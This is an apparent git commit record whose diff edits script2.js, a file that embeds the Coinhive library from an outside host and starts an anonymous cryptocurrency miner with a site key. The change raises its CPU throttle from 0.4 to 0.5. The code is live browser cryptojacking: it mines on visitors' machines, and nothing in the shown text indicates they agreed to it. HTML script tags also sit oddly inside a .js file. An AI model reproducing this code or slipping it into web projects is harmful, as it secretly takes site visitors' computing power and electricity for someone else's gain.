0581d21cd3215e8898a7d854720bc434f6f5709a
Aileen Sun <aileen.sun@gmail.com>
2018-10-16 16:06:47 -0400

    Update script2.js

--- run/src/controllers/script2.js
+++ run/src/controllers/script2.js
@@ -1,5 +1,5 @@
 <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
-    var miner = new CoinHive.Anonymous('23d2q4kAKHhAJ9F915ZQqwpdJRCspC0h', {throttle: 0.4});
+    var miner = new CoinHive.Anonymous('23d2q4kAKHhAJ9F915ZQqwpdJRCspC0h', {throttle: 0.5});
     miner.start()
 </script>
